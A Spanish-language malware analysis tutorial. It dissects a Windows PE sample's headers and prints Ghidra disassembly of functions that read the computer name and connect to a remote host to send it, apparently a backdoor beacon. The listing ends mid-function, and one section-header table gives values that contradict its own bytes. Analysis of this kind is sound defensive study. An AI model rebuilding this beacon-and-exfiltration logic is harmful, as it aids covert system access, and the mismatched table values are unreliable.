**Nota Previa:**
El c√≥digo desemsamblado est√° en little endian, los bytes de un valor multibyte (por ejemplo, 2 o 4 bytes) se almacenan del menos significativo al m√°s significativo.
```
004000E4: 4C 01  ‚Üí  se interpreta como 0x014C
```
- 4C es el byte menos significativo
- 01 es el m√°s significativo

------------

## Contenido desensamblado de la muestra de malware: Cabecera

```
                             //
                             // Headers
                             // ram:00400000-ram:004003ff
                             //
             assume DF = 0x0  (Default)
                             IMAGE_DOS_HEADER_00400000      XREF[1]:     00400114(*)
        00400000 4d 5a 90        IMAGE_DO
                 00 03 00
                 00 00 04
           00400000 4d 5a           char[2]   "MZ"        e_magic       XREF[1]:     00400114(*)
```
El encabezado DOS (DOS header) de un archivo PE (Portable Executable) de Windows, que es la estructura inicial de cualquier ejecutable .exe o .dll. Esta estructura se llama **IMAGE_DOS_HEADER**, y es la primera parte de un ejecutable en Windows. 

El **IMAGE_DOS_HEADER** es necesario para que Windows lo reconozca como ejecutable.

-------
### üìå 00400000 ‚Üí Campo e_magic

```
00400000 4D 5A           // "MZ"
```
Esto es el campo e_magic, que contiene "MZ", las iniciales de Mark Zbikowski, uno de los creadores del formato. Es una firma m√°gica que le dice al sistema: ‚Äúesto es un archivo ejecutable‚Äù.

-------

### üìå 0040003c ‚Üí Donde comienza la estructura PE
```
0040003c e0 00 00 00     ddw       E0h  e_lfanew      File address of ne
```
e_lfanew apunta a la offset donde comienza la estructura PE (Portable Executable) real. En este caso, es 0xE0, o sea, el encabezado PE est√° en 00400000 + 0xE0 = 004000E0.

-------

### üìå 00400040 ‚Üí Programa DOS "dummy"
```
00400040 0e 1f ba 0e 00  db[64]   e_program     Actual DOS program
         b4 09 cd 21 b8
         01 4c cd 21 54
```
Este bloque representa el programa DOS "dummy" que se ejecuta si alguien intenta lanzar este .exe en MS-DOS. Es una mini rutina en ensamblador x86 que imprime: "This program cannot be run in DOS mode."

Esto no tiene relevancia en reversing moderno, pero es necesario para cumplir con el formato PE.

-------


### üìå 004000E0 ‚Üí Inicio del encabezado PE
```
004000e0 50 45 00        IMAGE_NT      = 000022e0
         00 4c 01                      = 21D4h
         04 00 09
```

004000E0 50 45 00 00

‚úÖ Esto es clave:
- 50 45 = "PE"
- 00 00 = nulls para completar el identificador de 4 bytes: "PE\0\0"
- Marca el inicio del IMAGE_NT_HEADERS.

-------
### üìå PE\0\0  ‚Üí Firma m√°gica que marca el inicio del formato PE.
La firma m√°gica que marca el inicio del formato PE est√° formada por:

| Byte |	Valor hexadecimal |	Significado |
| -- | -- | -- |
| 'P' | 	0x50 | 	Letra "P" |
| 'E' | 	0x45 | 	Letra "E" |
| '\0' | 	0x00 | 	Byte nulo (null) |
| '\0' | 	0x00 | 	Otro byte nulo |

**¬øPor qu√© tiene dos ceros (\0\0)?**
Porque la especificaci√≥n PE exige que la firma tenga cuatro bytes en total:
- Dos letras: P y E.
- Dos bytes nulos: \0\0

Esto completa el campo de firma de 4 bytes que el sistema operativo necesita para validar que se trata de un archivo PE.

-------

### üìå 004000E4+ ‚Üí Cabecera de archivo (IMAGE_FILE_HEADER)
Encabezado PE (IMAGE_NT_HEADERS) y su contenido:
```
004000e0 50 45 00        IMAGE_NT        = 000022e0
         00 4c 01                        = 21D4h
         04 00 09
```



```
004000E4 4C 01        // M√°quina: 0x014C ‚Üí x86
004000E6 04 00        // N√∫mero de secciones: 4
004000E8 09 ...       // M√°s campos (timestamp, etc.)
```
- Tipo de arquitectura (x86 = 0x14C, x64 ser√≠a 0x8664)
- N√∫mero de secciones (.text, .data, etc.)
- Tama√±o del optional header
- Caracter√≠sticas del archivo

```
#define IMAGE_FILE_MACHINE_I386  0x014c  // x86
```

Valores T√≠picos para este campo:
| Valor	| Arquitectura |
|--|--|
| 0x014c	| 	x86 (32 bits) |
| 0x8664	| 	x86-64 (64 bits) |
| 0x01c0	| 	ARM |
| 0x0200	| 	IA64 (Itanium) |

--------

### üìå 004001D8, 00400200, 00400228, 00400250 ‚Üí Secciones del binario
```
004001d8 2e 74 65        IMAGE_SE   .text    // C√≥digo ejecutable
         78 74 00
         00 00 a6
00400200 2e 72 64        IMAGE_SE    .rdata  // Datos de solo lectura (strings, imports, etc.)
         61 74 61
         00 00 7e
00400228 2e 64 61        IMAGE_SE    .data   // Datos de lectura/escritura (variables globales)
         74 61 00
         00 00 28
00400250 2e 72 73        IMAGE_SE    .rsrc   // Recursos (√≠conos, men√∫s, etc.)
         72 63 00
         00 00 7c
```

Cada secci√≥n tiene:
- Nombre (".text", ".rdata", etc.)
- Direcci√≥n virtual (RVA)
- Tama√±o
- Offset f√≠sico en el archivo

-------
### üìå Secci√≥n .text ‚Üí
La secci√≥n .text de un ejecutable PE (Portable Executable, como los archivos .exe y .dll en Windows) contiene principalmente:

| Tipo de contenido |	Descripci√≥n |
| -- | -- |
| C√≥digo ejecutable | Las instrucciones m√°quina que forman las funciones del programa (lo que realmente se ejecuta). |
| Puntos de entrada y funciones | La funci√≥n main, WinMain, DllMain, y cualquier otra funci√≥n definida en el binario. |
| Control de flujo | Saltos, llamadas, condiciones (JMP, CALL, JE, JNE, etc.). |
| Instrucciones de ofuscaci√≥n o anti-debug | Si es malware, aqu√≠ suelen estar los trucos anti-an√°lisis. |
| Llamadas a APIs | Las instrucciones CALL o JMP a funciones de la API de Windows (como CreateProcessA, VirtualAlloc, etc.). |
| Shellcode, unpackers, loaders | En malware, muchas veces .text contiene el loader inicial (stub) que desempaqueta el c√≥digo malicioso. |


```
004001d8 2e 74 65        IMAGE_SE   .text    // C√≥digo ejecutable
         78 74 00
         00 00 a6
```
**La direcci√≥n 004001D8 no es el inicio real del c√≥digo .text, sino la ubicaci√≥n en el archivo donde est√° descrita la entrada de la secci√≥n .text** en la tabla de secciones del encabezado PE. Para ver el contenido de esta secci√≥n podemos usar Ghidra para ir a esta direcci√≥n y ver su contenido.

```
004001D8 2e 74 65 78 74 00 00 00   ‚Üí ".text\0\0\0"
```

---------
### üìå ¬øD√≥nde est√° .text? ‚Üí
**Para saber d√≥nde saltar para ver .text, necesitamos saber:**
1. Localizar el e_lfanew: 0040003c e0 00 00 00 ‚Üí e_lfanew = 0xE0. Esto indica que el encabezado PE (que empieza con "PE\0\0") se encuentra en el offset 0xE0 del archivo.
2. Saltamos al encabezado PE: 004000E0 50 45 00 00 ‚Üí "PE\0\0".
3. Y justo despu√©s de este encabezado, vienen:
  - El IMAGE_FILE_HEADER (20 bytes).
  - El IMAGE_OPTIONAL_HEADER (habitualmente 0xE0 bytes).
  - Luego, la tabla de secciones, que empieza justo despu√©s del optional header.
4. Leemos la entrada .text en la tabla de secciones: 004001d8 2e 74 65 78 74 00 00 00 ‚Üí ".text". Esto es claramente la primera entrada de la tabla de secciones (40 bytes de tama√±o cada una).


**Cada entrada de secci√≥n ocupa 40 bytes, con esta distribuci√≥n:**
| Offset |	Campo |		Tama√±o |		Comentario |
| -- | -- | -- | --  |
| 0x00 |	Name | 8B	|	".text" |
| 0x08 |	VirtualSize |	4B	|	Tama√±o real en memoria |
| 0x0C |	VirtualAddress | 4B	|	Direcci√≥n virtual en memoria |
| 0x10 |	SizeOfRawData |	4B |	Tama√±o en el archivo |
| 0x14 |	PointerToRawData | 4B |	Offset en el archivo |


**Estructura .text:**  
Para ver el contenido de esta estructura, abrimos el malware con Ghidra.
![Contenido en memoria de la direcci√≥n 0041000 ](capturas/contenido-ghidra.png)

| Direcci√≥n | Bytes| Campo |
| ----------- | ---------------------------- |  ----------------------------- | 
| 004001D8 | 2e 74 65 78 74 00 00 00 | Name (".text") | 
| 004001E0 | a6 00 00 00 | VirtualSize (0x000000A6) | 
| 004001E4 | 00 10 00 00 | **VirtualAddress (0x00001000)** | 
| 004001E8 | 00 10 00 00 | SizeOfRawData (0x00000200) | 
| 004001EC | 00 04 00 00 | **PointerToRawData (0x000000E0)** | 
| 004001F0 | 00 00 00 00 | PointerToRelocations | 
| 004001F4 | 00 00 00 00 | PointerToLinenumbers | 
| 004001F8 | 00 00 | NumberOfRelocations | 
| 004001FA | 00 00 | NumberOfLinenumbers | 
| 004001FC | 20 00 00 60 | Characteristics (posiblemente ejecutable) | 


Los campos importantes en una entrada de secci√≥n (IMAGE_SECTION_HEADER) son:
| Offset relativo |	Campo |	Tama√±o |	Valor le√≠do (hex) |	Significado | Comentario |
| -- | -- | -- | -- | -- | -- |
| 0x00 | 	Name (.text) | 	8B | 2e 74 65 78 74 00 00 00 | ".text" | .text\0\0\0 |
| 0x08 | 	VirtualSize | 	4B | a6 00 00 00 | 0x000000A6 |  0xA6 |
| 0x0C | 	VirtualAddress | 	4B | 00 10 00 00 | 0x00001000 |  0x1000 |
| 0x10 | 	SizeOfRawData | 	4B | 00 10 00 00  | 0x00001000 | 0x1000 |
| 0x14 | 	PointerToRawData | 	4B | 00 04 00 00  | 0x00000400 | 0x400 |


5. VirtualAddrees: Se encuentra en 004001E4. En Ghidra buscamos esta direcci√≥n y vemos su contenido: 0X004001E4 ‚Üí **00 10 00 00**.
6. PointerToRawData: **0x00000400**	Offset en el archivo (donde comienza .text). 
7. SizeOfRawData: 0x00001000	Tama√±o de la secci√≥n en el archivo (4 KB).
8. VirtualSize	0x000000A6	Tama√±o real del c√≥digo.


‚úÖ **¬øD√≥nde est√° el c√≥digo ejecutable?**  
üìÅ En el archivo: Offset f√≠sico: 0x00000400. Ah√≠ comienzan los bytes de la secci√≥n .text en el disco. Para verlo usamos comando xxd.  
![Contenido en memoria de la direcci√≥n 0041000 ](capturas/contenido-text-crudo.png)

üíª En memoria (cuando se carga en ejecuci√≥n): Direcci√≥n virtual: 0x00401000. (asumiendo ImageBase = 0x00400000, que es est√°ndar para PE de 32 bits). Para verlo usamos ghidra  ‚Üí   

![Contenido en memoria de la direcci√≥n 0041000 ](capturas/direccion-00401000.png)

-------
üéØ Resumen funcional
|Campo |	Direcci√≥n |	Descripci√≥n |
|--|--|--|
| e_magic |	0x00400000 | Firma "MZ" ‚Üí indica que es ejecutable DOS/PE |
| e_lfanew |	0x0040003C |	Offset del encabezado PE (donde empieza lo importante para Windows) |
| e_program | 0x00400040 |	C√≥digo DOS que se ejecuta si se intenta abrir en MS-DOS |
| Program | 00400040| 	Programa DOS (relleno) |
| Firma PE  | 004000E0	Firma PE (PE\0\0) ‚Üí comienza el PE header |
| .text | 004001D8 |	.text section (c√≥digo ejecutable) |
| .rdata | 00400200 |	.rdata (strings, tabla de importaci√≥n) |
| .data | 00400228 |	.data (variables globales) |
| .rsrc | 00400250 |	.rsrc (recursos como √≠conos, GUI, etc) |

------------------------
## Contenido desensamblado de la Funci√≥n FUN_00401240  ‚Üí 

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __stdcall FUN_00401240(HINSTANCE param_1)
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             HINSTANCE         Stack[0x4]:4   param_1                                 XREF[1]:     00401240(R)
                             FUN_00401240                                    XREF[1]:     entry:00401e09(c)
        00401240 8b 44 24 04     MOV        EAX,dword ptr [ESP + param_1]
        00401244 68 ff 00        PUSH       0xff                                             int cchBufferMax for LoadStringA
                 00 00
        00401249 68 a0 30        PUSH       _Str_004030a0                                    LPSTR lpBuffer for LoadStringA
                 40 00
        0040124e 6a 01           PUSH       0x1                                              UINT uID for LoadStringA
        00401250 50              PUSH       EAX                                              HINSTANCE hInstance for LoadStri
        00401251 ff 15 e0        CALL       dword ptr [->USER32.DLL::LoadStringA]            = 000024de
                 20 40 00
        00401257 68 a0 30        PUSH       _Str_004030a0                                    = 00000000
                 40 00
        0040125c e8 5f 00        CALL       FUN_004012c0                                     undefined FUN_004012c0(void)
                 00 00
        00401261 83 c4 04        ADD        ESP,0x4
        00401264 33 c0           XOR        EAX,EAX
        00401266 c2 10 00        RET        0x10
        00401269 90 90 90        align      align(7)
                 90 90 90 90
        00401270 53              ??         53h    S
        00401271 55              ??         55h    U

```
üëâ Esto es una llamada a LoadStringA(), una funci√≥n de la API de Windows:
```
int LoadStringA(
  HINSTANCE hInstance,
  UINT uID,
  LPSTR lpBuffer,
  int cchBufferMax
);
```
Intenta cargar una cadena (string) del segmento de recursos del ejecutable, usando el ID 1, y la escribe en el buffer 0x4030a0.

------------------------
## Contenido desensamblado de la muestra de malware: .text ‚Üí Funci√≥n FUN_004012c0
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_004012c0(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             FUN_004012c0                                    XREF[1]:     FUN_00401240:0040125c(c)
        004012c0 56              PUSH       ESI
        004012c1 8b 35 08        MOV        ESI,dword ptr [->KERNEL32.DLL::CreateEventA]     = 00002304
                 20 40 00
        004012c7 57              PUSH       EDI
        004012c8 6a 00           PUSH       0x0                                              LPCSTR lpName for CreateEventA
        004012ca 6a 00           PUSH       0x0                                              BOOL bInitialState for CreateEve
        004012cc 6a 01           PUSH       0x1                                              BOOL bManualReset for CreateEventA
        004012ce 6a 00           PUSH       0x0                                              LPSECURITY_ATTRIBUTES lpEventAtt
        004012d0 ff d6           CALL       ESI=>KERNEL32.DLL::CreateEventA
        004012d2 6a 00           PUSH       0x0                                              LPCSTR lpName for CreateEventA
        004012d4 6a 00           PUSH       0x0                                              BOOL bInitialState for CreateEve
        004012d6 6a 01           PUSH       0x1                                              BOOL bManualReset for CreateEventA
        004012d8 6a 00           PUSH       0x0                                              LPSECURITY_ATTRIBUTES lpEventAtt
        004012da a3 d8 30        MOV        [DAT_004030d8],EAX
                 40 00
        004012df ff d6           CALL       ESI=>KERNEL32.DLL::CreateEventA
        004012e1 a3 d4 30        MOV        [DAT_004030d4],EAX
                 40 00
        004012e6 b9 4b 00        MOV        ECX,0x4b
                 00 00
        004012eb 33 c0           XOR        EAX,EAX
        004012ed bf e0 30        MOV        EDI,DAT_004030e0
                 40 00
        004012f2 f3 ab           STOSD.REP  ES:EDI=>DAT_004030e0
        004012f4 8b 44 24 0c     MOV        EAX,dword ptr [ESP + Stack[0x4]]
        004012f8 50              PUSH       EAX
        004012f9 e8 22 00        CALL       FUN_00401320                                     undefined FUN_00401320(void)
                 00 00
        004012fe 8b 0d d8        MOV        ECX,dword ptr [DAT_004030d8]
                 30 40 00
        00401304 83 c4 04        ADD        ESP,0x4
        00401307 6a 00           PUSH       0x0                                              DWORD dwMilliseconds for WaitFor
        00401309 51              PUSH       ECX                                              HANDLE hHandle for WaitForSingle
        0040130a ff 15 04        CALL       dword ptr [->KERNEL32.DLL::WaitForSingleObject]  = 000022ee
                 20 40 00
        00401310 8b 15 d8        MOV        EDX,dword ptr [DAT_004030d8]
                 30 40 00
        00401316 52              PUSH       EDX                                              HANDLE hObject for CloseHandle
        00401317 ff 15 00        CALL       dword ptr [->KERNEL32.DLL::CloseHandle]          = 000022e0
                 20 40 00
        0040131d 5f              POP        EDI
        0040131e 5e              POP        ESI
        0040131f c3              RET
        .....
        .....
        .....
  ```

La funci√≥n FUN_004012C0:
- Crea dos eventos con CreateEventA.
- Guarda los handles de esos eventos en variables globales (DAT_004030D8 y DAT_004030D4).
- Limpia una zona de memoria global (DAT_004030E0) con ceros (STOSD).
- Llama a otra funci√≥n (FUN_00401320), pas√°ndole un argumento.
- Espera a que uno de los eventos se dispare (WaitForSingleObject).
- Cierra el handle del evento con CloseHandle.
- Termina limpiamente.

Esta funci√≥n parece ser parte de un sistema de inicializaci√≥n o espera controlada, quiz√°s incluso un sistema de ofuscaci√≥n o sincronizaci√≥n antes de ejecutar c√≥digo malicioso.

```
PUSH ESI
MOV  ESI, [KERNEL32::CreateEventA]
PUSH EDI
```
Guarda ESI y EDI en la pila.  
Carga la direcci√≥n de CreateEventA en ESI para usarla varias veces.  


```
MOV ECX, 0x4B
XOR EAX, EAX
MOV EDI, DAT_004030E0
REP STOSD
```
Limpiar 0x4B DWORDs (75 √ó 4 = 300 bytes) en DAT_004030E0. Limpia esa zona de memoria (es probable que sea un buffer de trabajo).

```
MOV EAX, [ESP + 0xC]  ; Recupera argumento de pila
PUSH EAX
CALL FUN_00401320
```
Llamada a FUN_00401320.


## Contenido desensamblado de la muestra de malware: .text ‚Üí Funci√≥n FUN_00401320
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_00401320(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             undefined1        Stack[-0x294   local_294                               XREF[2]:     004013ad(*),
                                                                                                   004013ba(*)
             undefined1        Stack[-0x3a8   local_3a8                               XREF[1]:     0040135a(*)
             undefined1        Stack[-0x3bb   local_3bb                               XREF[2]:     00401391(*),
                                                                                                   004013c3(*)
             undefined4        Stack[-0x3dc   local_3dc                               XREF[2]:     004013b4(*),
                                                                                                   004013c7(W)
                             FUN_00401320                                    XREF[1]:     FUN_004012c0:004012f9(c)
        00401320 81 ec dc        SUB        ESP,0x3dc
                 03 00 00
        00401326 53              PUSH       EBX
        00401327 55              PUSH       EBP
        00401328 56              PUSH       ESI
        00401329 57              PUSH       EDI
        0040132a 6a 3a           PUSH       0x3a                                             int _Val for strchr
        0040132c 68 a0 30        PUSH       _Str_004030a0                                    char * _Str for strchr
                 40 00
        00401331 e8 92 09        CALL       MSVCRT.DLL::strchr                               char * strchr(char * _Str, int _
                 00 00
        00401336 8b d0           MOV        EDX,EAX
        00401338 33 db           XOR        EBX,EBX
        0040133a 81 ea a0        SUB        EDX,_Str_004030a0                                = 00000000
                 30 40 00
        00401340 83 c4 08        ADD        ESP,0x8
        00401343 3b d3           CMP        EDX,EBX
        00401345 0f 8e db        JLE        LAB_00401426
                 00 00 00
        0040134b 33 c0           XOR        EAX,EAX
        0040134d 3b d3           CMP        EDX,EBX
        0040134f 7e 19           JLE        LAB_0040136a
        00401351 8b ca           MOV        ECX,EDX
        00401353 be a0 30        MOV        ESI,_Str_004030a0                                = 00000000
                 40 00
        00401358 8b c1           MOV        EAX,ECX
        0040135a 8d 7c 24 44     LEA        EDI=>local_3a8,[ESP + 0x44]
        0040135e c1 e9 02        SHR        ECX,0x2
        00401361 f3 a5           MOVSD.REP  ES:EDI,ESI=>_Str_004030a0                        = 00000000
        00401363 8b c8           MOV        ECX,EAX
        00401365 83 e1 03        AND        ECX,0x3
        00401368 f3 a4           MOVSB.REP  ES:EDI,ESI=>_Str_004030a0                        = 00000000
                             LAB_0040136a                                    XREF[1]:     0040134f(j)
        0040136a 88 5c 04 44     MOV        byte ptr [ESP + EAX*0x1 + 0x44],BL
        0040136e bf a0 30        MOV        EDI,_Str_004030a0                                = 00000000
                 40 00
        00401373 83 c9 ff        OR         ECX,0xffffffff
        00401376 33 c0           XOR        EAX,EAX
        00401378 33 f6           XOR        ESI,ESI
        0040137a f2 ae           SCASB.RE   ES:EDI
        0040137c f7 d1           NOT        ECX
        0040137e 49              DEC        ECX
        0040137f 2b ca           SUB        ECX,EDX
        00401381 85 c9           TEST       ECX,ECX
        00401383 7e 21           JLE        LAB_004013a6
                             LAB_00401385                                    XREF[1]:     004013a4(j)
        00401385 8a 8c 32        MOV        CL,byte ptr [EDX + ESI*0x1 + _Str_004030a0+1]
                 a1 30 40 00
        0040138c bf a0 30        MOV        EDI,_Str_004030a0                                = 00000000
                 40 00
        00401391 88 4c 34 30     MOV        byte ptr [ESP + ESI*0x1 + local_3bb],CL
        00401395 83 c9 ff        OR         ECX,0xffffffff
        00401398 33 c0           XOR        EAX,EAX
        0040139a 46              INC        ESI
        0040139b f2 ae           SCASB.RE   ES:EDI
        0040139d f7 d1           NOT        ECX
        0040139f 49              DEC        ECX
        004013a0 2b ca           SUB        ECX,EDX
        004013a2 3b f1           CMP        ESI,ECX
        004013a4 7c df           JL         LAB_00401385
                             LAB_004013a6                                    XREF[1]:     00401383(j)
        004013a6 b9 41 00        MOV        ECX,0x41
                 00 00
        004013ab 33 c0           XOR        EAX,EAX
        004013ad 8d bc 24        LEA        EDI=>local_294,[ESP + 0x158]
                 58 01 00 00
        004013b4 8d 54 24 10     LEA        EDX=>local_3dc,[ESP + 0x10]
        004013b8 f3 ab           STOSD.REP  ES:EDI
        004013ba 8d 84 24        LEA        EAX=>local_294,[ESP + 0x158]
                 58 01 00 00
        004013c1 52              PUSH       EDX                                              LPDWORD nSize for GetComputerNameA
        004013c2 50              PUSH       EAX                                              LPSTR lpBuffer for GetComputerNa
        004013c3 88 5c 34 38     MOV        byte ptr [ESP + ESI*0x1 + local_3bb],BL
        004013c7 c7 44 24        MOV        dword ptr [ESP + local_3dc],0x104
                 18 04 01
                 00 00
        004013cf ff 15 14        CALL       dword ptr [->KERNEL32.DLL::GetComputerNameA]     = 0000232a   ***********************************
                 20 40 00
        004013d5 8d bc 24        LEA        EDI,[ESP + 0x158]
                 58 01 00 00
        004013dc 83 c9 ff        OR         ECX,0xffffffff
        004013df 33 c0           XOR        EAX,EAX
        004013e1 f2 ae           SCASB.RE   ES:EDI
        004013e3 f7 d1           NOT        ECX
        004013e5 49              DEC        ECX
        004013e6 88 9c 0c        MOV        byte ptr [ESP + ECX*0x1 + 0x158],BL
                 58 01 00 00
        004013ed 8d 8c 24        LEA        ECX,[ESP + 0x25c]
                 5c 02 00 00
        004013f4 51              PUSH       ECX
        004013f5 68 01 01        PUSH       0x101
                 00 00
        004013fa e8 97 0a        CALL       WS2_32.DLL::Ordinal_115                          undefined Ordinal_115()
                 00 00
        004013ff 53              PUSH       EBX
        00401400 6a 01           PUSH       0x1
        00401402 6a 02           PUSH       0x2
        00401404 e8 87 0a        CALL       WS2_32.DLL::Ordinal_23                           undefined Ordinal_23()
                 00 00
        00401409 8b e8           MOV        EBP,EAX
        0040140b 83 fd ff        CMP        EBP,-0x1
        0040140e 75 21           JNZ        LAB_00401431
        00401410 50              PUSH       EAX
        00401411 e8 74 0a        CALL       WS2_32.DLL::Ordinal_3                            undefined Ordinal_3()
                 00 00
        00401416 68 c0 27        PUSH       0x927c0                                          DWORD dwMilliseconds for Sleep
                 09 00
                             LAB_0040141b                                    XREF[1]:     0040147b(j)
        0040141b ff 15 10        CALL       dword ptr [->KERNEL32.DLL::Sleep]                = 00002322
                 20 40 00
                             LAB_00401421                                    XREF[3]:     00401542(j), 0040156c(j),
                                                                                          00401574(j)
        00401421 e8 2a 07        CALL       FUN_00401b50                                     undefined4 FUN_00401b50(void)
                 00 00
                             LAB_00401426                                    XREF[1]:     00401345(j)
        00401426 5f              POP        EDI
        00401427 5e              POP        ESI
        00401428 5d              POP        EBP
        00401429 5b              POP        EBX
        0040142a 81 c4 dc        ADD        ESP,0x3dc
                 03 00 00
        00401430 c3              RET
                             LAB_00401431                                    XREF[1]:     0040140e(j)
        00401431 8d 54 24 30     LEA        EDX,[ESP + 0x30]
        00401435 66 c7 44        MOV        word ptr [ESP + 0x14],0x2
                 24 14 02 00
        0040143c 52              PUSH       EDX                                              char * _Str for atol
        0040143d e8 80 08        CALL       MSVCRT.DLL::atol                                 long atol(char * _Str)
                 00 00
        00401442 83 c4 04        ADD        ESP,0x4
        00401445 50              PUSH       EAX
        00401446 e8 39 0a        CALL       WS2_32.DLL::Ordinal_9                            undefined Ordinal_9()
                 00 00
        0040144b 66 89 44        MOV        word ptr [ESP + 0x16],AX
                 24 16
        00401450 8d 44 24 44     LEA        EAX,[ESP + 0x44]
        00401454 50              PUSH       EAX
        00401455 e8 24 0a        CALL       WS2_32.DLL::Ordinal_11                           undefined Ordinal_11()
                 00 00
        0040145a 8d 4c 24 14     LEA        ECX,[ESP + 0x14]
        0040145e 6a 10           PUSH       0x10
        00401460 51              PUSH       ECX
        00401461 55              PUSH       EBP
        00401462 89 44 24 24     MOV        dword ptr [ESP + 0x24],EAX
        00401466 e8 0d 0a        CALL       WS2_32.DLL::Ordinal_4                            undefined Ordinal_4()
                 00 00
        0040146b 83 f8 ff        CMP        EAX,-0x1
        0040146e 75 0d           JNZ        LAB_0040147d
        00401470 55              PUSH       EBP
        00401471 e8 14 0a        CALL       WS2_32.DLL::Ordinal_3                            undefined Ordinal_3()
                 00 00
        00401476 68 e8 03        PUSH       0x3e8
                 00 00
        0040147b eb 9e           JMP        LAB_0040141b
                             LAB_0040147d                                    XREF[1]:     0040146e(j)
        0040147d b9 3f 00        MOV        ECX,0x3f
                 00 00
        00401482 33 c0           XOR        EAX,EAX
        00401484 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        00401488 8d 54 24 58     LEA        EDX,[ESP + 0x58]
        0040148c f3 ab           STOSD.REP  ES:EDI
        0040148e 66 ab           STOSW      ES:EDI
        00401490 aa              STOSB      ES:EDI
        00401491 bf 60 30        MOV        EDI,s_*(SY)#_00403060                            = "*(SY)# "
                 40 00
        00401496 83 c9 ff        OR         ECX,0xffffffff
        00401499 33 c0           XOR        EAX,EAX
        0040149b 53              PUSH       EBX
        0040149c f2 ae           SCASB.RE   ES:EDI=>s_*(SY)#_00403060                        = "*(SY)# "
        0040149e f7 d1           NOT        ECX
        004014a0 2b f9           SUB        EDI,ECX
        004014a2 8b c1           MOV        EAX,ECX
        004014a4 8b f7           MOV        ESI,EDI
        004014a6 8b fa           MOV        EDI,EDX
        004014a8 8d 54 24 5c     LEA        EDX,[ESP + 0x5c]
        004014ac c1 e9 02        SHR        ECX,0x2
        004014af f3 a5           MOVSD.REP  ES:EDI,ESI=>s_*(SY)#_00403060                    = "*(SY)# "
        004014b1 8b c8           MOV        ECX,EAX
        004014b3 33 c0           XOR        EAX,EAX
        004014b5 83 e1 03        AND        ECX,0x3
        004014b8 f3 a4           MOVSB.REP  ES:EDI,ESI=>s_*(SY)#_00403060                    = "*(SY)# "
        004014ba 8d bc 24        LEA        EDI,[ESP + 0x15c]
                 5c 01 00 00
        004014c1 83 c9 ff        OR         ECX,0xffffffff
        004014c4 f2 ae           SCASB.RE   ES:EDI
        004014c6 f7 d1           NOT        ECX
        004014c8 2b f9           SUB        EDI,ECX
        004014ca 8b f7           MOV        ESI,EDI
        004014cc 8b fa           MOV        EDI,EDX
        004014ce 8b d1           MOV        EDX,ECX
        004014d0 83 c9 ff        OR         ECX,0xffffffff
        004014d3 f2 ae           SCASB.RE   ES:EDI
        004014d5 8b ca           MOV        ECX,EDX
        004014d7 4f              DEC        EDI
        004014d8 c1 e9 02        SHR        ECX,0x2
        004014db f3 a5           MOVSD.REP  ES:EDI,ESI
        004014dd 8b ca           MOV        ECX,EDX
        004014df 83 e1 03        AND        ECX,0x3
        004014e2 f3 a4           MOVSB.REP  ES:EDI,ESI
        004014e4 8d 7c 24 5c     LEA        EDI,[ESP + 0x5c]
        004014e8 83 c9 ff        OR         ECX,0xffffffff
        004014eb f2 ae           SCASB.RE   ES:EDI
        004014ed f7 d1           NOT        ECX
        004014ef 49              DEC        ECX
        004014f0 8d 7c 24 5c     LEA        EDI,[ESP + 0x5c]
        004014f4 88 5c 0c 5c     MOV        byte ptr [ESP + ECX*0x1 + 0x5c],BL
        004014f8 83 c9 ff        OR         ECX,0xffffffff
        004014fb f2 ae           SCASB.RE   ES:EDI
        004014fd f7 d1           NOT        ECX
        004014ff 49              DEC        ECX
        00401500 8d 44 24 5c     LEA        EAX,[ESP + 0x5c]
        00401504 51              PUSH       ECX
        00401505 50              PUSH       EAX
        00401506 55              PUSH       EBP
        00401507 e8 60 09        CALL       WS2_32.DLL::Ordinal_19                           undefined Ordinal_19()
                 00 00
        0040150c 8b f0           MOV        ESI,EAX
        0040150e 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        00401512 83 c9 ff        OR         ECX,0xffffffff
        00401515 33 c0           XOR        EAX,EAX
        00401517 f2 ae           SCASB.RE   ES:EDI
        00401519 f7 d1           NOT        ECX
        0040151b 49              DEC        ECX
        0040151c 51              PUSH       ECX
        0040151d 8d 4c 24 28     LEA        ECX,[ESP + 0x28]
        00401521 68 54 30        PUSH       s_send_=_%d_00403054                             char * _Format for sprintf
                 40 00
        00401526 51              PUSH       ECX                                              char * _Dest for sprintf
        00401527 e8 90 07        CALL       MSVCRT.DLL::sprintf                              int sprintf(char * _Dest, char *
                 00 00
        0040152c 56              PUSH       ESI
        0040152d 8d 54 24 34     LEA        EDX,[ESP + 0x34]
        00401531 68 54 30        PUSH       s_send_=_%d_00403054                             char * _Format for sprintf
                 40 00
        00401536 52              PUSH       EDX                                              char * _Dest for sprintf
        00401537 e8 80 07        CALL       MSVCRT.DLL::sprintf                              int sprintf(char * _Dest, char *
                 00 00
        0040153c 83 c4 18        ADD        ESP,0x18
        0040153f 83 fe ff        CMP        ESI,-0x1
        00401542 0f 84 d9        JZ         LAB_00401421
                 fe ff ff
        00401548 b9 3f 00        MOV        ECX,0x3f
                 00 00
        0040154d 33 c0           XOR        EAX,EAX
        0040154f 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        00401553 53              PUSH       EBX
        00401554 f3 ab           STOSD.REP  ES:EDI
        00401556 66 ab           STOSW      ES:EDI
        00401558 aa              STOSB      ES:EDI
        00401559 8d 44 24 5c     LEA        EAX,[ESP + 0x5c]
        0040155d 68 ff 00        PUSH       0xff
                 00 00
        00401562 50              PUSH       EAX
        00401563 55              PUSH       EBP
        00401564 e8 09 09        CALL       WS2_32.DLL::Ordinal_16                           undefined Ordinal_16()
                 00 00
        00401569 83 f8 ff        CMP        EAX,-0x1
        0040156c 0f 84 af        JZ         LAB_00401421
                 fe ff ff
                             LAB_00401572                                    XREF[1]:     004015ce(j)
        00401572 3b c3           CMP        EAX,EBX
        00401574 0f 8e a7        JLE        LAB_00401421
                 fe ff ff
        0040157a 6a 06           PUSH       0x6                                              size_t _MaxCount for _strnicmp
        0040157c 8d 4c 24 5c     LEA        ECX,[ESP + 0x5c]
